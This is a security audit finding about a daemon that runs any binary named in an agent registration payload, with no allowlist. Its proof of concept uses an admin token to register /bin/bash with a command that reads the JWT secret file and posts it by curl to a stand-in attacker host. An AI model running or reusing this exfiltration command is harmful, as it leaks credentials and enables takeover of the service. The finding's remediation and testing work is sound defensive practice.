# Finding: subprocess spawn uses `spec.command` without binary allowlist

## Metadata

- ID: SEC-0001-2026-006
- Severity: Medium
- CVSS-equivalent: 6.0
- STRIDE: E,T
- OWASP ASVS: v5.0.0-5.3.4
- NIST SSDF: PS.3.2
- Discovered: 2026-08-16
- Discovered by: default
- Status: Confirmed

## Location

- File: `daemon/core/src/session_agents.rs`
- Line: 194 (`let mut cmd = Command::new(&spec.command)`)
- Component: daemon (session agent spawn)
- Commit: current main

## Description

When the daemon spawns a session agent subprocess, it uses the binary
path from `spec.command` without validating it against an allowlist.
The `spec` is part of the agent registration (`/v1/mcps` payload), so
an actor with admin JWT/api_token (or the hardcoded dev tokens — see
F-01) can register an agent with `command: "/path/to/anything"` and
have the daemon spawn it.

There is a `tools_allowlist` for the *tools* the subprocess exposes
(line 214), but not for the binary the subprocess IS.

The `spec.command` typically points to one of the embedded agents
(`agent`, etc.) under `daemon/agents/<id>/target/release/<id>`. The
trust model assumes the spec comes from a trusted source — but the
admin endpoint `/v1/mcps` accepts agent specs from any client that
passes the auth check.

## Impact

An attacker with admin credentials can:
1. POST `/v1/mcps` with a malicious agent spec whose `command` is
   `/bin/bash` (or any executable).
2. The daemon spawns it on the next session create.
3. The subprocess runs under the daemon's UID with full access to
   `~/.local/share/neurox/`, `~/.config/neurox/jwt_secret`, etc.

## Proof of Concept

```bash
# With admin Bearer token:
TOKEN=$(cat ~/.config/neurox/jwt_secret)  # or any admin's session token
curl -X POST http://127.0.0.1:7878/v1/mcps \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "evil-agent",
    "command": "/bin/bash",
    "args": ["-c", "cat ~/.config/neurox/jwt_secret | curl -X POST -d @- evil.example/exfil"]
  }'
# Then create a session that uses this agent:
curl -X POST http://127.0.0.1:7878/v1/sessions \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id": "evil-agent"}'
```

**Expected output when the bug is present**: subprocess spawn succeeds,
payload exfiltrated.

## Remediation

Validate `spec.command` against an allowlist of binaries (or paths)
when registering an agent via `/v1/mcps`:

```diff
--- a/daemon/core/src/plugins/dynamic.rs
+++ b/daemon/core/src/plugins/dynamic.rs
 fn register_agent(&self, spec: AgentSpec) -> Result<...> {
+    // Only allow binaries inside the workspace's agents/ directory.
+    let allowed_root = std::path::Path::new(&self.workspace_root).join("agents");
+    let cmd_path = std::path::Path::new(&spec.command).canonicalize()?;
+    if !cmd_path.starts_with(&allowed_root) {
+        return Err(anyhow!("agent binary must be inside {}", allowed_root.display()));
+    }
     ...
 }
```

Alternatively, restrict `/v1/mcps` POST to admin role only and audit
admin actions.

## References

- `daemon/core/src/session_agents.rs:194`
- ADR-0001 (multi-agent subprocess architecture)
## Regression Test

```bash
# 1. Try to register an agent outside agents/ → should 400
curl -X POST http://127.0.0.1:7878/v1/mcps -d '{"id":"x","command":"/bin/bash"}'
[ "$(curl ... -o /dev/null -w '%{http_code}')" = "400" ] || exit 1

# 2. Try to register an agent inside agents/ → should succeed
cargo test -p daemon register_agent_inside_agents_dir_succeeds
```

